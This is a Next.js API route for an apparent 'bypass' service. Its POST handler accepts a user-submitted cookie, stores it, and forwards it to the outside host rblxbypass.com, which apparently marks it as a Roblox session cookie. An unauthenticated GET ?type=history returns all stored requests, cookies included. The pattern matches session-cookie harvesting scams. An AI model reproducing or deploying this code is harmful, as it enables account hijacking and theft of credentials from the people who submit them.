import { NextRequest, NextResponse } from "next/server";
import { storage } from "@/lib/storage";
import { bypassRequestSchema } from "@/lib/schema";
import { generateCSRFToken, setCSRFCookie, verifyCSRFToken, getClientIP } from "@/lib/csrf";

// GET /api/bypass or /api/csrf-token - Retrieve data based on query
export async function GET(request: NextRequest) {
  const url = new URL(request.url);
  const type = url.searchParams.get("type");

  try {
    // If requesting history
    if (type === "history") {
      const requests = await storage.getBypassRequests();
      return NextResponse.json(
        { requests: requests || [] },
        {
          status: 200,
          headers: {
            "Cache-Control": "no-store, no-cache, must-revalidate",
          },
        }
      );
    }

    // Default: Return CSRF token
    const token = await generateCSRFToken();
    await setCSRFCookie(token);

    return NextResponse.json(
      { csrfToken: token },
      {
        status: 200,
        headers: {
          "Cache-Control": "no-store, no-cache, must-revalidate",
        },
      }
    );
  } catch (error) {
    console.error("[v0] GET request error:", error);
    return NextResponse.json(
      { error: "Failed to process request" },
      { status: 500 }
    );
  }
}

// POST /api/bypass - Submit bypass request
export async function POST(request: NextRequest) {
  try {
    // Verify CSRF token
    const csrfToken = request.headers.get("x-csrf-token");
    const isValidCSRF = await verifyCSRFToken(csrfToken || "");

    if (!isValidCSRF) {
      console.warn("[v0] Invalid CSRF token attempt from:", await getClientIP());
      return NextResponse.json(
        { message: "Invalid CSRF token" },
        { status: 403 }
      );
    }

    // Parse and validate request body
    const body = await request.json();
    const input = bypassRequestSchema.parse(body);

    console.log("[v0] Bypass request received for cookie");

    // Create database record
    const requestRecord = await storage.createBypassRequest({
      cookie: input.cookie,
    });

    try {
      // Call external bypass service
      const externalResponse = await fetch(
        "https://rblxbypass.com/api/bypass",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "User-Agent": "ImHellAMo/1.0",
          },
          body: JSON.stringify({
            cookie: input.cookie,
            timestamp: new Date().toISOString(),
          }),
          signal: AbortSignal.timeout(30000), // 30 second timeout
        }
      );

      console.log("[v0] External API response status:", externalResponse.status);

      if (!externalResponse.ok) {
        throw new Error(
          `External API returned status ${externalResponse.status}`
        );
      }

      const externalData = await externalResponse.json();

      // Update record with success
      await storage.updateBypassRequestStatus(
        requestRecord.id,
        "success",
        externalData
      );

      console.log("[v0] Bypass request completed successfully:", requestRecord.id);

      return NextResponse.json(
        {
          success: true,
          data: externalData,
          requestId: requestRecord.id,
        },
        { status: 200 }
      );
    } catch (externalError) {
      const errorMessage =
        externalError instanceof Error ? externalError.message : "Unknown error";

      console.error("[v0] External API error:", errorMessage);

      // Update record with failure
      await storage.updateBypassRequestStatus(requestRecord.id, "failed", {
        error: errorMessage,
      });

      return NextResponse.json(
        {
          success: false,
          message: "Bypass request failed",
          error: errorMessage,
          requestId: requestRecord.id,
        },
        { status: 500 }
      );
    }
  } catch (error) {
    if (error instanceof Error) {
      console.error("[v0] Request validation error:", error.message);

      // Check if it's a Zod validation error
      if (error instanceof SyntaxError) {
        return NextResponse.json(
          { message: "Invalid JSON in request body" },
          { status: 400 }
        );
      }

      return NextResponse.json(
        { message: error.message || "Invalid input" },
        { status: 400 }
      );
    }

    console.error("[v0] Unexpected error in bypass route:", error);
    return NextResponse.json(
      { message: "Internal server error" },
      { status: 500 }
    );
  }
}

// OPTIONS - Handle CORS preflight
export async function OPTIONS(request: NextRequest) {
  return NextResponse.json(
    {},
    {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": process.env.NEXT_PUBLIC_APP_URL || "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers":
          "Content-Type, x-csrf-token, Authorization",
      },
    }
  );
}
